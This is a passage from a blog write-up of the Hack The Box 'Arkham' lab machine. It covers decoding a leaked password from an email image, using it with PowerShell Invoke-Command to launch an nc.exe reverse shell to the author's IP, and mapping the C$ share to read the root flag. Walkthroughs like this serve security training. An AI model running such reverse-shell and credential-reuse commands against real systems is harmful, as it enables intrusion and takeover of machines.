class="line">CXh+vzVqAxEgQIAAgSMT0O+PjN7ABAgQIEBgawL6&#x2F;daoDUSAAAECBI5MwO&#x2F;DPTJ6AxMgQIAAgT6B</span><br><span class="line">4vfhTsUZ&#x2F;n24Q&#x2F;3+H737P&#x2F;7+r96bOp7tCRAgQIAAge0L&#x2F;J9&#x2F;eP3f3PCPO8e9&#x2F;ODZkev77adrRAIE</span><br><span class="line">CBAgQGBegaLfe34&#x2F;L6loBAgQIEAgRwH9PseqyIkAAQIECMwroN&#x2F;P6ykaAQIECBDIUUC&#x2F;z7EqciJA</span><br><span class="line">gAABAvMK6PfzeopGgAABAgRyFNDvc6yKnAgQIECAwLwC+v28nqIRIECAAIEcBZY&#x2F;f59jXnIiQIAA</span><br><span class="line">AQIE5hP4&#x2F;wjr8uh7Wbf&#x2F;AAAAAElFTkSuQmCC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----boundary-LibPST-iamunique-672158152_-_---</span><br></pre></td></tr></table></figure>
<p>We can see two interesting things here, first one is this message : <code>Master Wayne stop forgetting your password</code> and second one is the base-64 encoded image. I decoded it and saved it :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;backups# nano image001.png.b64</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;backups# base64 -d image001.png.b64 &gt; image001.png</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;backups# file image001.png</span><br><span class="line">image001.png: PNG image data, 677 x 343, 8-bit&#x2F;color RGB, non-interlaced</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;arkham&#x2F;backups#</span><br></pre></td></tr></table></figure>
<p><code>image001.png</code> :<br><img src="/images/hackthebox/arkham/13.png" alt=""><br>Great, we have the password for <code>Batman</code>. By checking the local group memberships of <code>Batman</code> we can see that <code>Batman</code> is in the Administrators group, and also in the Remote management users group :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net user batman</span><br><span class="line">net user batman</span><br><span class="line">User name                    Batman</span><br><span class="line">Full Name</span><br><span class="line">Comment</span><br><span class="line">User&#39;s comment</span><br><span class="line">Country&#x2F;region code          001 (United States)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            2&#x2F;3&#x2F;2019 9:25:51 AM</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          2&#x2F;3&#x2F;2019 9:25:51 AM</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script</span><br><span class="line">User profile</span><br><span class="line">Home directory</span><br><span class="line">Last logon                   8&#x2F;10&#x2F;2019 1:29:47 AM</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Administrators       *Remote Management Use</span><br><span class="line">                             *Users</span><br><span class="line">Global Group memberships     *None</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure>
<p>So we can use <code>powershell</code>‘s <code>Invoke-Command</code> with the credentials we have to get a reverse shell  :</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;powershell</span><br><span class="line">powershell</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\&gt; <span class="variable">$username</span> = <span class="string">'batman'</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">'batman'</span></span><br><span class="line">PS C:\&gt; <span class="variable">$password</span> = <span class="string">'Zx^#QZX+T!123'</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">'Zx^#QZX+T!123'</span></span><br><span class="line">PS C:\&gt; <span class="variable">$securePassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$securePassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line">PS C:\&gt; <span class="variable">$credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$securePassword</span></span><br><span class="line"><span class="variable">$credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$securePassword</span></span><br><span class="line">PS C:\&gt; <span class="built_in">Invoke-command</span> <span class="literal">-computername</span> ARKHAM <span class="literal">-credential</span> <span class="variable">$credential</span> <span class="literal">-scriptblock</span> &#123; cmd.exe /c <span class="string">"C:\windows\system32\spool\drivers\color\nc.exe"</span> <span class="literal">-e</span> cmd.exe <span class="number">10.10</span>.xx.xx <span class="number">1338</span> &#125;                                      </span><br><span class="line"><span class="built_in">Invoke-command</span> <span class="literal">-computername</span> ARKHAM <span class="literal">-credential</span> <span class="variable">$credential</span> <span class="literal">-scriptblock</span> &#123; cmd.exe /c <span class="string">"C:\windows\system32\spool\drivers\color\nc.exe"</span> <span class="literal">-e</span> cmd.exe <span class="number">10.10</span>.xx.xx <span class="number">1338</span> &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/arkham/14.png" alt=""></p>
<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p><code>Batman</code> is in the Administrators group, however I couldn’t read the flag :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Batman\Documents&gt;cd ..&#x2F;..&#x2F;Administrator&#x2F;Desktop</span><br><span class="line">cd ..&#x2F;..&#x2F;Administrator&#x2F;Desktop</span><br><span class="line">Access is denied.</span><br><span class="line"></span><br><span class="line">C:\Users\Batman\Documents&gt;type C:\Users\Administrator\Desktop\root.txt </span><br><span class="line">type C:\Users\Administrator\Desktop\root.txt</span><br><span class="line">Access is denied.</span><br><span class="line"></span><br><span class="line">C:\Users\Batman\Documents&gt;</span><br></pre></td></tr></table></figure>
<p>That was weird, after trying a lot of things I wanted to see If anything will change if I mounted <code>C$</code> then accessed it.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net use Z: \\ARKHAM\C$</span><br><span class="line">net use Z: \\ARKHAM\C$</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>
<p>And yes that worked :<br><img src="/images/hackthebox/arkham/15.png" alt=""><br>We owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/fortune/">Hack The Box - Fortune</a><br>Next Hack The Box write-up : <a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-08-10</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/cryptography/" rel="tag">#cryptography</a> <a class="tag-link" href="/tags/exploit-development/" rel="tag">#exploit-development</a> <a class="tag-link" href="/tags/python/" rel="tag">#python</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/smb/" rel="tag">#smb</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a> <a class="tag-link" href="/tags/windows/" rel="tag">#windows</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
